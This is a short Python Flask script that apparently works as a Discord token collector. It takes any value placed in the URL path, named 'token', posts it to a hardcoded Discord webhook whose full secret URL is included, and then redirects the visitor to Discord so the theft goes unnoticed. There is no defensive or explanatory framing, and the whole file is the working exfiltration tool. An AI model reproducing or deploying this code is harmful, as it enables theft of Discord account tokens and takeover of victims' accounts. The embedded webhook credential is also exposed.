from dhooks import Webhook
from flask import Flask, redirect
e = "https://discord.com/api/webhooks/1226475240020770898/C0Z0TnkaWszupXMgbPyzbMzdxmjT8U4NuJ-wnGTXC1h2DJjaXIrs6oGlmecnYLbNoxra"
app = Flask(__name__)
hook = Webhook(e)
@app.route('/<string:token>')
def index(token):
  hook.send(token)
  return redirect("https://discord.com/app")

if __name__ == "__main__":
  app.run(host='0.0.0.0', port=81)
